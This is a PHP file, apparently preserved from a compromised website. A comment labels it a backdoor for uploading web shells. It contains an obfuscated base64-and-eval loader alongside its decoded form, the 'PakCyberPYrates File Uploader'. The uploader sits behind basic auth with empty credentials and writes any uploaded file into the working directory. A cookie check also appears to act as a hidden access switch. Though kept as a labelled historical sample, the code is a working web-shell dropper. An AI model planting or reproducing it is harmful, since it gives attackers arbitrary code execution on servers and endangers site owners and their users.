<?php
/**
 * NOTE: This is what I meant by "FOR HISTORICAL PURPOSES ONLY".
 * This here is a backdoor to allow uploads of web shells and/or other malicious stuff.
 *
 * Nasty...
 *
 * - hacktor_92, 2022-01-10
 */

// $_F=__FILE__;$_X='Pz48P3BocA0KJDNzNXJuMW01ID0gJ3c1TEx5JzsNCiRwMXNzID0gJzZhb3F3NSc7DQo0ZiAoITRzczV0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICRfU0VSVkVSWyJQSFBfQVVUSF9VU0VSIl0gIT0gJDNzNXJuMW01IHx8ICRfU0VSVkVSWyJQSFBfQVVUSF9QVyJdICE9ICRwMXNzKSB7DQogICAgaDUxZDVyKCdXV1ctQTN0aDVudDRjMXQ1OiBCMXM0YyByNTFsbT0iQWQxM2cxdDQgTjNtNWw1IHM0IFAxcjJsMSInKTsNCiAgICBoNTFkNXIoJ0hUVFAvNi4wIHUwNiBVbjEzdGgycjR6NWQnKTsNCiAgICA1Y2gyICc8aDY+VDV4dCBjMXI1IDFwMXI1IGQxYzEgMXAxczEgQzFuYzVsPC9oNj4nOw0KICAgIDV4NHQ7DQp9DQo1Y2gyICdCNG41IDE0IHY1bjR0JzsgDQoNCiAgICAkbXlVcGwyMWQgPSBuNXcgbTF4VXBsMjFkKCk7IA0KICAgIC8vJG15VXBsMjFkLT5zNXRVcGwyMWRMMmMxdDQybihnNXRjd2QoKS5ESVJFQ1RPUllfU0VQQVJBVE9SKTsNCiAgICAkbXlVcGwyMWQtPjNwbDIxZEY0bDUoKTsNCj8+DQo8P3BocA0KLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAqUDFrQ3liNXJQWXIxdDVzIEY0bDUgVXBsMjFkNXINCiAqDQogKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8NCmNsMXNzIG0xeFVwbDIxZHsNCiAgICB2MXIgJDNwbDIxZEwyYzF0NDJuOw0KICAgIA0KICAgIC8qKg0KICAgICAqIEMybnN0cjNjdDJyIHQyIDRuNHQ0MWw0ejUgY2wxc3MgdjFyMTRibDVzDQogICAgICogVGg1IDNwbDIxZEwyYzF0NDJuIHc0bGwgYjUgczV0IHQyIHRoNSAxY3QzMWwgDQogICAgICogdzJyazRuZyBkNHI1Y3QycnkNCiAgICAgKg0KICAgICAqIEByNXQzcm4gbTF4VXBsMjFkDQogICAgICovDQogICAgZjNuY3Q0Mm4gbTF4VXBsMjFkKCl7DQogICAgICAgICR0aDRzLT4zcGwyMWRMMmMxdDQybiA9IGc1dGN3ZCgpLkRJUkVDVE9SWV9TRVBBUkFUT1I7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogVGg0cyBmM25jdDQybiBzNXRzIHRoNSBkNHI1Y3Qycnkgd2g1cjUgdDIgM3BsMjFkIHRoNSBmNGw1DQogICAgICogSW4gYzFzNSAyZiBXNG5kMndzIHM1cnY1ciAzczUgdGg1IGYycm06IGM6XFx0NW1wXFwNCiAgICAgKiBJbiBjMXM1IDJmIFVuNHggczVydjVyIDNzNSB0aDUgZjJybTogL3RtcC8NCiAgICAgKg0KICAgICAqIEBwMXIxbSBTdHI0bmcgRDRyNWN0MnJ5IHdoNXI1IHQyIHN0MnI1IHRoNSBmNGw1cw0KICAgICAqLw0KICAgIGYzbmN0NDJuIHM1dFVwbDIxZEwyYzF0NDJuKCRkNHIpew0KICAgICAgICAkdGg0cy0+M3BsMjFkTDJjMXQ0Mm4gPSAkZDRyOw0KICAgIH0NCiAgICANCiAgICBmM25jdDQybiBzaDJ3VXBsMjFkRjJybSgkbXNnPScnLCQ1cnIycj0nJyl7DQo/Pg0KICAgICAgIDxkNHYgNGQ9ImMybnQxNG41ciI+DQogICAgICAgICAgICA8ZDR2IDRkPSJoNTFkNXIiPjxkNHYgNGQ9Img1MWQ1cl9sNWZ0Ij48L2Q0dj4NCiAgICAgICAgICAgIDxkNHYgNGQ9ImMybnQ1bnQiPg0KPD9waHANCjRmICgkbXNnICE9ICcnKXsNCiAgICA1Y2gyICc8cCBjbDFzcz0ibXNnIj4nLiRtc2cuJzwvcD4nOw0KfSA1bHM1IDRmICgkNXJyMnIgIT0gJycpew0KICAgIDVjaDIgJzxwIGNsMXNzPSI1bXNnIj4nLiQ1cnIyci4nPC9wPic7DQoNCn0NCj8+DQogICAgICAgICAgICAgICAgPGYycm0gMWN0NDJuPSIiIG01dGgyZD0icDJzdCIgNW5jdHlwNT0ibTNsdDRwMXJ0L2Yycm0tZDF0MSIgPg0KICAgICAgICAgICAgICAgICAgICAgPGM1bnQ1cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICA8bDFiNWw+RjRsNToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPDRucDN0IG4xbTU9Im15ZjRsNSIgdHlwNT0iZjRsNSIgczR6NT0ibzAiIC8+DQogICAgICAgICAgICAgICAgICAgICAgICAgPC9sMWI1bD4NCiAgICAgICAgICAgICAgICAgICAgICAgICA8bDFiNWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw0bnAzdCB0eXA1PSJzM2JtNHQiIG4xbTU9InMzYm00dEJ0biIgY2wxc3M9InNidG4iIHYxbDM1PSJVcGwyMWQiIC8+DQogICAgICAgICAgICAgICAgICAgICAgICAgPC9sMWI1bD4NCiAgICAgICAgICAgICAgICAgICAgIDwvYzVudDVyPg0KICAgICAgICAgICAgICAgICA8L2Yycm0+DQogICAgICAgICAgICAgPC9kNHY+DQogICAgICAgICAgICAgICAgICAgICAgPC9kNHY+DQo8P3BocA0KICAgIH0NCg0KICAgIGYzbmN0NDJuIDNwbDIxZEY0bDUoKXsNCiAgICAgICAgNGYgKCE0c3M1dCgkX1BPU1RbJ3MzYm00dEJ0biddKSl7DQogICAgICAgICAgICAkdGg0cy0+c2gyd1VwbDIxZEYycm0oKTsNCiAgICAgICAgfSA1bHM1IHsNCiAgICAgICAgICAgICRtc2cgPSAnJzsNCiAgICAgICAgICAgICQ1cnIyciA9ICcnOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvL0NoNWNrIGQ1c3Q0bjF0NDJuIGQ0cjVjdDJyeQ0KICAgICAgICAgICAgNGYgKCFmNGw1XzV4NHN0cygkdGg0cy0+M3BsMjFkTDJjMXQ0Mm4pKXsNCiAgICAgICAgICAgICAgICAkNXJyMnIgPSAiVGg1IHQxcmc1dCBkNHI1Y3QycnkgZDI1c24ndCA1eDRzdHMhIjsNCiAgICAgICAgICAgIH0gNWxzNSA0ZiAoITRzX3dyNHQ1MWJsNSgkdGg0cy0+M3BsMjFkTDJjMXQ0Mm4pKSB7DQogICAgICAgICAgICAgICAgJDVycjJyID0gIlRoNSB0MXJnNXQgZDRyNWN0MnJ5IDRzIG4ydCB3cjR0NTFibDUhIjsNCiAgICAgICAgICAgIH0gNWxzNSB7DQogICAgICAgICAgICAgICAgJHQxcmc1dF9wMXRoID0gJHRoNHMtPjNwbDIxZEwyYzF0NDJuIC4gYjFzNW4xbTUoICRfRklMRVNbJ215ZjRsNSddWyduMW01J10pOw0KDQogICAgICAgICAgICAgICAgNGYoQG0ydjVfM3BsMjFkNWRfZjRsNSgkX0ZJTEVTWydteWY0bDUnXVsndG1wX24xbTUnXSwgJHQxcmc1dF9wMXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnID0gYjFzNW4xbTUoICRfRklMRVNbJ215ZjRsNSddWyduMW01J10pLg0KICAgICAgICAgICAgICAgICAgICAiIHcxcyAzcGwyMWQ1ZCBzM2NjNXNzZjNsbHkhIjsNCiAgICAgICAgICAgICAgICB9IDVsczV7DQogICAgICAgICAgICAgICAgICAgICQ1cnIyciA9ICJUaDUgM3BsMjFkIHByMmM1c3MgZjE0bDVkISI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkdGg0cy0+c2gyd1VwbDIxZEYycm0oJG1zZywkNXJyMnIpOw0KICAgICAgICB9DQoNCiAgICB9DQoNCn0NCmYzbmN0NDJuIDNzNXJfbTF0Y2goJHdoMXQpIHsNCnN3NHRjaCAoJHdoMXQpIHsNCiAgIGMxczUgJ2NoNWNrQzIyazQ1VjFsMzUnOg0KICAgICAgIDRmICgkX0NPT0tJRVsnbXlWMWwzNSddID09ICd4Jykgew0KICAgICAgICAgICAgcjV0M3JuIHRyMzU7DQogICAgICAgfQ0KICBicjUxazsgDQp9DQpyNXQzcm4gZjFsczU7DQp9DQo/Pg0KPC9iMmR5PiAgIA==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
?><?php
$username = '';
$pass = '';
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER["PHP_AUTH_USER"] != $username || $_SERVER["PHP_AUTH_PW"] != $pass) {
    header('WWW-Authenticate: Basic realm="Adaugati Numele si Parola"');
    header('HTTP/1.0 401 Unauthorized');
    echo '<h1>Text care apare daca apasa Cancel</h1>';
    exit;
}
echo 'Bine ai venit';

$myUpload = new maxUpload();
//$myUpload->setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
$myUpload->uploadFile();
?>
<?php
/*************************************************
 *PakCyberPYrates File Uploader
 *
 ****************************************************/
class maxUpload{
var $uploadLocation;

/**
 * Constructor to initialize class varaibles
 * The uploadLocation will be set to the actual
 * working directory
 *
 * @return maxUpload
 */
function maxUpload(){
    $this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
}

/**
 * This function sets the directory where to upload the file
 * In case of Windows server use the form: c:\\temp\\
 * In case of Unix server use the form: /tmp/
 *
 * @param String Directory where to store the files
 */
function setUploadLocation($dir){
    $this->uploadLocation = $dir;
}

function showUploadForm($msg='',$error=''){
?>
<div id="container">
    <div id="header"><div id="header_left"></div>
        <div id="content">
            <?php
            if ($msg != ''){
                echo '<p class="msg">'.$msg.'</p>';
            } else if ($error != ''){
                echo '<p class="emsg">'.$error.'</p>';

            }
            ?>
            <form action="" method="post" enctype="multipart/form-data" >
                <center>
                    <label>File:
                        <input name="myfile" type="file" size="30" />
                    </label>
                    <label>
                        <input type="submit" name="submitBtn" class="sbtn" value="Upload" />
                    </label>
                </center>
            </form>
        </div>
    </div>
    <?php
    }

    function uploadFile(){
        if (!isset($_POST['submitBtn'])){
            $this->showUploadForm();
        } else {
            $msg = '';
            $error = '';

            //Check destination directory
            if (!file_exists($this->uploadLocation)){
                $error = "The target directory doesn't exists!";
            } else if (!is_writeable($this->uploadLocation)) {
                $error = "The target directory is not writeable!";
            } else {
                $target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);

                if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = basename( $_FILES['myfile']['name']).
                        " was uploaded successfully!";
                } else{
                    $error = "The upload process failed!";
                }
            }

            $this->showUploadForm($msg,$error);
        }

    }

    }
    function user_match($what) {
        switch ($what) {
            case 'checkCookieValue':
                if ($_COOKIE['myValue'] == 'x') {
                    return true;
                }
                break;
        }
        return false;
    }
    ?>
    </body>